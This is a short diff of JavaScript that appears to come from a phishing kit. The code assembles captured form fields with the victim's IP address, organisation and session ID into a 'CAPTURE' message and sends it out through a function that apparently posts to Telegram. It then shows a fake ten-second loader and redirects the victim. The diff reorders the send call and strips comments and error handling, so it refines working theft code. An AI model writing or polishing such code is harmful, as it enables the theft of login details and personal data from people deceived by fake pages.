@@ -176,13 +176,10 @@
         }
 
         var _msg = '🔐 <b>CAPTURE | ' + _pg.toUpperCase() + '</b>\n━━━━━━━━━━━━━━━\n' + _flds.join('\n') + '\n━━━━━━━━━━━━━━━\n📍 IP: <code>' + _ip + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>';
-        // Envoi simple sans clavier
-        _tg(_M, _msg).catch(function(){});
 
-        // Afficher le loader pendant 10 secondes
         _ldr(true, 10);
-        
-        // Redirection automatique après 10 secondes
+        _tg(_M, _msg);
+
         setTimeout(function(){
           _ldr(false);
           if (_nx && _nx !== '#' && _nx !== '') {
